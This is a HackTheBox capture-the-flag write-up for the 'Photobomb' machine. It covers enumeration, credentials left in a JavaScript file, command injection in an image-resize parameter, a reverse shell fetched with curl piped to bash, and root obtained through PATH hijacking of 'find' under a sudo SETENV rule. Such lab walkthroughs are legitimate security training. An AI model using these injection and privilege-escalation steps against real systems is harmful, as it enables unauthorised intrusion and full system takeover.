Hello and welcome back to another write up. This one is on box from Hackthebox called Photobomb. 
Starting the box with nmap:

```
# nmap -T4 -sC -sV -p- 10.10.11.182 > nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Not many stuff here - just ssh and http that shows us hostname which we add to our `/etc/hosts` file:

```
# echo "10.10.11.182 photobomb.htb" >> /etc/hosts 
```

Trying to find out what the page uses by trying `http://photobomb.htb/index.php` returns us this:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG1.png?raw=true)

CLicking the link on the site redirects us to `/printer` which prompts us for credentials which we don't have right now. 
There isn't anything else we can do right now so let's use feroxbuster to find other directories. But that doesn't return 
anything either:

```
# feroxbuster -u http://photobomb.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://photobomb.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       22l       95w      843c http://photobomb.htb/
401      GET        7l       12w      188c http://photobomb.htb/printer
401      GET        7l       12w      188c http://photobomb.htb/printers
401      GET        7l       12w      188c http://photobomb.htb/printer_friendly
----*********------
```

Subdomain brute force doesn't return anything either. Now let's view source for the webpage. 
In source there is this(view-source:http://photobomb.htb/photobomb.js):

```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Now we have creds so let's get to `/printer`. We can download photos. If we catch the request in burp we see that there is parameter
dimensions which means that the server doesn't store all the images somewhere but rather converts them on the go. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG2.png?raw=true)

Here we can try to do command injection starting with sleep. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG3.png?raw=true)

And it works. Hosting python server with `shell.sh` and using curl and pipe into bash gives us reverse shell on nc listener 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG4.png?raw=true)

and we get user flag. 

```
wizard@photobomb:~$ cat user.txt 
75a86a8fe31f5**********
```

Looking at `sudo -l` there is file cleanup.sh:

```
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

We can set enviroment variable while running the script cleanup.sh which looks like this:

```
root@photobomb:/home/wizard/photobomb# cat /opt/cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

There is find command that isn't using absolute path which we can abuse with PATH injection.

```
wizard@photobomb:/tmp# echo "/bin/bash -p" > find
wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh 
root@photobomb:/home/wizard/photobomb# id
uid=0(root) gid=0(root) groups=0(root)
```

Now we can get flag from /root/root.txt:

```
root@photobomb:~# cat /root/root.txt 
b76f595541ed616c2a3963b**********
```

This is it for this write up thank you for reading.
